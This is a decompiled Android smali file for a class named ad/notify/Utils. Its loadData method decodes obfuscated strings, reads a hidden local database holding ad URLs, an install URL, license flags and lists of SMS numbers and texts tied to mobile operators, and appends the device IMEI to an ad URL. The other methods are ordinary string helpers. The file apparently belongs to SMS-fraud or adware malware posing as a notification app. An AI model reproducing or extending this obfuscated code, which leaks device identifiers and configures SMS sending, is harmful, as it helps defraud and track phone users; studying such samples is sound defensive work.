.class public Lad/notify/Utils;
.super Ljava/lang/Object;
.source "Utils.java"


# static fields
.field private static result:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static loadData(Landroid/content/Context;)V
    .locals 12
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/4 v11, 0x1

    const/4 v10, 0x0

    .line 84
    new-instance v4, Ljava/lang/StringBuffer;

    invoke-direct {v4}, Ljava/lang/StringBuffer;-><init>()V

    .line 85
    .local v4, "message":Ljava/lang/StringBuffer;
    const-string v8, "VVVVVVVVVVVVVVVVVVVVVVVVVVVV"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 86
    const-string v8, "V                          V"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 87
    const-string v8, "V     v{u-jZgu nZ {u--     V"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 88
    const-string v8, "V                          V"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 89
    const-string v8, "VVVVVVVVVVVVVVVVVVVVVVVVVVVV"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 91
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v8, v4}, Ljava/io/PrintStream;->println(Ljava/lang/Object;)V

    .line 93
    sget-object v8, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    if-eqz v8, :cond_0

    .line 143
    :goto_0
    return-void

    .line 97
    :cond_0
    :try_start_0
    new-instance v0, Lorg/MobileDb/MobileDatabase;

    invoke-direct {v0}, Lorg/MobileDb/MobileDatabase;-><init>()V

    .line 98
    .local v0, "db":Lorg/MobileDb/MobileDatabase;
    const-string v8, "hl4#hl?$h>?:?Q>w"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x1

    invoke-virtual {v0, v8, v9}, Lorg/MobileDb/MobileDatabase;->loadFrom(Ljava/lang/String;Z)V

    .line 100
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v9, "=w /L?> Z}"

    invoke-static {v9}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 102
    invoke-static {v0}, Lad/notify/NotificationActivity;->loadScreens(Lorg/MobileDb/MobileDatabase;)V

    .line 104
    const-string v8, "#4::]e!#"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8}, Lorg/MobileDb/MobileDatabase;->getTableByName(Ljava/lang/String;)Lorg/MobileDb/Table;

    move-result-object v7

    .line 105
    .local v7, "table":Lorg/MobileDb/Table;
    const-string v8, "Cl/"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    sput-object v8, Lad/notify/NotificationApplication;->url:Ljava/lang/String;

    .line 106
    const-string v8, "/]S4e#4"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Integer;

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    if-ne v8, v11, :cond_1

    move v8, v11

    :goto_1
    sput-boolean v8, Lad/notify/NotificationApplication;->showLicense:Z

    .line 107
    const-string v8, "#4SLe>O#:?l:"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Integer;

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    if-ne v8, v11, :cond_2

    move v8, v11

    :goto_2
    sput-boolean v8, Lad/notify/NotificationApplication;->secondStart:Z

    .line 108
    const-string v8, "/]S4e#4O$]:1OLe4OwC::Le"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Integer;

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    if-ne v8, v11, :cond_3

    move v8, v11

    :goto_3
    sput-boolean v8, Lad/notify/NotificationApplication;->licenseWithOneButton:Z

    .line 110
    const-string v8, "]e#:?//"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    sput-object v8, Lad/notify/NotificationApplication;->installUrl:Ljava/lang/String;

    .line 111
    const-string v8, "?>Ul/"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    sput-object v8, Lad/notify/NotificationApplication;->adUrl:Ljava/lang/String;

    .line 112
    sget-object v8, Lad/notify/NotificationApplication;->adUrl:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v9, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p0}, Lad/notify/Settings;->getImei(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    sput-object v8, Lad/notify/NotificationApplication;->adUrl:Ljava/lang/String;

    .line 113
    const-string v8, "?>i4l]L>"

    invoke-static {v8}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lorg/MobileDb/Table;->getFieldValueByName(Ljava/lang/String;I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Integer;

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    int-to-long v8, v8

    sput-wide v8, Lad/notify/NotificationApplication;->adPeriod:J

    .line 115
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "?>Ul/a "

    invoke-static {v10}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v10, Lad/notify/NotificationApplication;->adUrl:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 116
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "?>i4l]L>a "

    invoke-static {v10}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-wide v10, Lad/notify/NotificationApplication;->adPeriod:J

    invoke-virtual {v9, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 118
    invoke-static {v0}, Lad/notify/NotificationApplication;->loadRestriction(Lorg/MobileDb/MobileDatabase;)Ljava/util/Vector;

    move-result-object v6

    .line 119
    .local v6, "restrictions":Ljava/util/Vector;
    invoke-static {v0}, Lad/notify/NotificationApplication;->loadOperatorList(Lorg/MobileDb/MobileDatabase;)Ljava/util/Vector;

    move-result-object v5

    .line 120
    .local v5, "operatorList":Ljava/util/Vector;
    invoke-static {p0, v5, v6}, Lad/notify/NotificationApplication;->loadSmsSet(Landroid/content/Context;Ljava/util/Vector;Ljava/util/Vector;)V

    .line 122
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "#^#a "

    invoke-static {v10}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v10, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 124
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "#^#jLCe:a "

    invoke-static {v10}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v10, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v10}, Ljava/util/Vector;->size()I

    move-result v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 126
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_4
    sget-object v8, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v8}, Ljava/util/Vector;->size()I

    move-result v8

    if-lt v2, v8, :cond_4

    .line 133
    const/4 v6, 0x0

    .line 134
    const/4 v5, 0x0

    .line 135
    const/4 v0, 0x0

    .line 137
    invoke-static {}, Ljava/lang/System;->gc()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 139
    .end local v0    # "db":Lorg/MobileDb/MobileDatabase;
    .end local v2    # "i":I
    .end local v5    # "operatorList":Ljava/util/Vector;
    .end local v6    # "restrictions":Ljava/util/Vector;
    .end local v7    # "table":Lorg/MobileDb/Table;
    :catch_0
    move-exception v8

    move-object v1, v8

    .line 141
    .local v1, "ex":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    .end local v1    # "ex":Ljava/lang/Exception;
    .restart local v0    # "db":Lorg/MobileDb/MobileDatabase;
    .restart local v7    # "table":Lorg/MobileDb/Table;
    :cond_1
    move v8, v10

    .line 106
    goto/16 :goto_1

    :cond_2
    move v8, v10

    .line 107
    goto/16 :goto_2

    :cond_3
    move v8, v10

    .line 108
    goto/16 :goto_3

    .line 128
    .restart local v2    # "i":I
    .restart local v5    # "operatorList":Ljava/util/Vector;
    .restart local v6    # "restrictions":Ljava/util/Vector;
    :cond_4
    :try_start_1
    sget-object v8, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v8, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lad/notify/SmsItem;

    .line 129
    .local v3, "item":Lad/notify/SmsItem;
    sget-object v8, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v9, Ljava/lang/StringBuilder;

    iget-object v10, v3, Lad/notify/SmsItem;->number:Ljava/lang/String;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, "a "

    invoke-static {v10}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, v3, Lad/notify/SmsItem;->text:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 126
    add-int/lit8 v2, v2, 0x1

    goto :goto_4
.end method

.method public static replace(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p0, "inString"    # Ljava/lang/String;
    .param p1, "oldString"    # Ljava/lang/String;
    .param p2, "newString"    # Ljava/lang/String;

    .prologue
    .line 46
    new-instance v0, Ljava/lang/StringBuffer;

    const-string v2, ""

    invoke-static {v2}, Lad/notify/StringDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 48
    .local v0, "buffer":Ljava/lang/StringBuffer;
    invoke-virtual {p0, p1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    .line 49
    .local v1, "start":I
    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    .line 51
    const/4 v2, 0x0

    invoke-virtual {p0, v2, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 52
    invoke-virtual {v0, p2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 53
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    add-int/2addr v2, v1

    invoke-virtual {p0, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 57
    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    :goto_0
    return-object v2

    :cond_0
    move-object v2, p0

    .line 55
    goto :goto_0
.end method

.method public static replaceAll(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p0, "inString"    # Ljava/lang/String;
    .param p1, "oldString"    # Ljava/lang/String;
    .param p2, "newString"    # Ljava/lang/String;

    .prologue
    .line 62
    move-object v0, p0

    .line 65
    .local v0, "result":Ljava/lang/String;
    :goto_0
    invoke-virtual {v0, p1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    .line 67
    invoke-static {v0, p1, p2}, Lad/notify/Utils;->replace(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 69
    :cond_0
    return-object v0
.end method

.method public static split(Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;
    .locals 8
    .param p0, "src"    # Ljava/lang/String;
    .param p1, "separator"    # Ljava/lang/String;

    .prologue
    const/4 v7, -0x1

    .line 18
    const/4 v1, 0x1

    .line 19
    .local v1, "count":I
    const/4 v4, 0x0

    .line 23
    .local v4, "index":I
    :goto_0
    invoke-virtual {p0, p1, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v4

    .line 24
    if-ne v4, v7, :cond_0

    .line 29
    new-array v0, v1, [Ljava/lang/String;

    .line 31
    .local v0, "arr":[Ljava/lang/String;
    const/4 v5, 0x0

    .line 32
    .local v5, "start":I
    const/4 v2, 0x0

    .line 33
    .local v2, "end":I
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_1
    if-lt v3, v1, :cond_1

    .line 41
    return-object v0

    .line 25
    .end local v0    # "arr":[Ljava/lang/String;
    .end local v2    # "end":I
    .end local v3    # "i":I
    .end local v5    # "start":I
    :cond_0
    add-int/lit8 v1, v1, 0x1

    .line 26
    add-int/lit8 v4, v4, 0x1

    .line 21
    goto :goto_0

    .line 35
    .restart local v0    # "arr":[Ljava/lang/String;
    .restart local v2    # "end":I
    .restart local v3    # "i":I
    .restart local v5    # "start":I
    :cond_1
    invoke-virtual {p0, p1, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v2

    .line 36
    if-ne v2, v7, :cond_2

    invoke-virtual {p0, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v0, v3

    .line 38
    :goto_2
    add-int/lit8 v5, v2, 0x1

    .line 33
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 37
    :cond_2
    invoke-virtual {p0, v5, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v0, v3

    goto :goto_2
.end method
